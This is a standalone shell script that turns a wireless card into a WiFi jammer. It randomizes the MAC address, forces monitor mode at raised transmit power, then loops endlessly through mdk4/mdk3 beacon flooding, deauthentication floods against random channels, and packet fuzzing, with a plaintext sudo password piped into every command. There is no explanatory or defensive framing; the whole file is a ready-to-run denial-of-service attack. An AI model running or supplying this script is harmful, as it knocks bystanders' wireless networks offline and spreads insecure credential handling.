#!/bin/sh 
	echo parol | sudo -S rfkill unblock 0
	echo parol | sudo -S rfkill unblock 1
	echo parol | sudo -S rfkill unblock 2
	echo parol | sudo -S rfkill unblock 3
	echo parol | sudo -S rfkill unblock 4
	echo parol | sudo -S rfkill unblock 5
	
	echo parol | sudo -S iw reg set US
	echo parol | sudo -S airmon-ng check kill
	echo parol | sudo -S ip link set wlan0 down
	echo parol | sudo -S macchanger -r wlan0
	echo parol | sudo -S iw dev wlan0 set type monitor
	echo parol | sudo -S iw dev wlan0 set txpower fixed 26mBm
	echo parol | sudo -S iw dev wlan0 set txpower fixed 26mBm
 	echo parol | sudo -S ip link set wlan0 up
	while :
	do
		while :
		do
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 1234567' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 23425' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
			echo parol | sudo -S  sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
			echo parol | sudo -S  sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear && break
		done
echo parol | sudo -S rfkill unblock 0 && echo parol | sudo -S rfkill unblock 1 && echo parol | sudo -S rfkill unblock 2 && echo parol | sudo -S rfkill unblock 3 && echo parol | sudo -S rfkill unblock 4 && echo parol | sudo -S rfkill unblock 5 && echo parol | sudo -S rfkill unblock 6 && echo parol | sudo -S rfkill unblock 7 && echo parol | sudo -S rfkill unblock 8 && echo parol | sudo -S rfkill unblock 9 && echo parol | sudo -S rfkill unblock 10 && echo parol | sudo -S rfkill unblock 11 && echo parol | sudo -S iw reg set US && echo parol | sudo -S airmon-ng check kill && echo parol | sudo -S ip link set wlan0 down && echo parol | sudo -S macchanger -r wlan0 && echo parol | sudo -S iw dev wlan0 set type monitor && echo parol | sudo -S iw dev wlan0 set txpower fixed 26mBm && echo parol | sudo -S ip link set wlan0 up
	clear
	done

